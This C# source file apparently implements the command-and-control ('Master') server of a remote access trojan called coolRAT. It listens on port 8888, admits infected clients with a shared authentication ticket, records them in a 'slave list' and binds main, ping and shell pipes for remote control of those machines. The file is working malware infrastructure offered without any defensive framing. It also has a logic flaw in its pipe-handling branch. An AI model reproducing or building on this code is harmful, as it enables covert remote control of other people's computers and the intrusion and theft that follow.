using coolRAT.Libs;
using coolRAT.Libs.Packets;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace coolRAT.Master
{
    class Program
    {
        static void Main(string[] args)
        {
            MasterListener.RunInit(new ConnectionSettings(8888));
            Console.WriteLine("-- Master Server running");
            Console.ReadLine();
        }
    }

    public static class MasterListener
    {
        private static TcpListener ConnectionListener;
        private static Dictionary<Guid, Client> ConnectedClients;
        private static Action MainLoopTask;

        private static bool MainLoopAbort;
        private static ConnectionSettings Settings;

        public static void RunInit(ConnectionSettings settings)
        {
            Settings = settings;
            RunInit();
        }

        public static void RunInit()
        {
            if (Settings.IsEmpty())
                throw new ArgumentNullException(nameof(Settings));
            ConnectedClients = new Dictionary<Guid, Client>();
            ConnectionListener = new TcpListener(new IPEndPoint(IPAddress.Any, Settings.Port));
            ConnectionListener.Start();
            MainLoopTask = new Action(() =>
            {
                while (!MainLoopAbort)
                {
                    try
                    {
                        TcpConnection conn = (TcpConnection)ConnectionListener.AcceptTcpClient();
                        Console.WriteLine("[MasterListener] accept connection");
                        string packet_raw = conn.ReadPacket();
                        Packet packet = Packet.Deserialize(packet_raw);
                        switch(packet.Type)
                        {
                            case "AuthenticateConnectionPacket":
                                AuthenticateConnectionPacket auth_packet = AuthenticateConnectionPacket.Deserialize(packet_raw);
                                Console.WriteLine($"Received authentication ticket from {conn.Client.Client.RemoteEndPoint}: {auth_packet.AuthenticationTicket}");
                                if (auth_packet.AuthenticationTicket == Auth.ClientAuthenticationTicket)
                                {
                                    Console.WriteLine("Connection has been accepted.");

                                    // Add client to the slave list
                                    Client client = new Client(new TcpPipes(conn, null, null));
                                    ConnectionAuthenticatedPacket authenticated_packet = new ConnectionAuthenticatedPacket(true, client.UniqueId);
                                    conn.SendPacket(authenticated_packet);
                                    ConnectedClients.Add(client.UniqueId, client);
                                }
                                else
                                {
                                    Console.WriteLine("Connection has been denied.");
                                    ConnectionAuthenticatedPacket authenticated_packet = new ConnectionAuthenticatedPacket(false, Guid.Empty);
                                    conn.SendPacket(authenticated_packet);
                                }
                                break;
                            case "ConnectPipePacket":
                                ConnectPipePacket connect_packet = ConnectPipePacket.Deserialize(packet_raw);
                                if(!ConnectedClients.ContainsKey(connect_packet.ClientId))
                                {
                                    PipeConnectedPacket result_fail = new PipeConnectedPacket(connect_packet.ClientId, connect_packet.PipeType, false);
                                    conn.SendPacket(result_fail);
                                }

                                switch(connect_packet.PipeType)
                                {
                                    case PipeType.Main:
                                        Console.WriteLine($"Main pipe of client {connect_packet.ClientId} rebound successfully.");
                                        ConnectedClients[connect_packet.ClientId].Pipes.MainPipe = conn;
                                        break;
                                    case PipeType.Ping:
                                        Console.WriteLine($"Ping pipe of client {connect_packet.ClientId} rebound successfully.");
                                        ConnectedClients[connect_packet.ClientId].Pipes.PingPipe = conn;
                                        break;
                                    case PipeType.Shell:
                                        Console.WriteLine($"Shell pipe of client {connect_packet.ClientId} rebound successfully.");
                                        ConnectedClients[connect_packet.ClientId].Pipes.ShellPipe = conn;
                                        break;
                                }
                                PipeConnectedPacket result_success = new PipeConnectedPacket(connect_packet.ClientId, connect_packet.PipeType, true);
                                conn.SendPacket(result_success);
                                break;
                            case "DisconnectPipePacket":
                                break;
                        }
                        
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e.Message);
                    }
                }
            });
            MainLoopAbort = false;
            //Run
            Task.Run(MainLoopTask);
            Console.WriteLine("Listening for connections...");
        }
    }
}
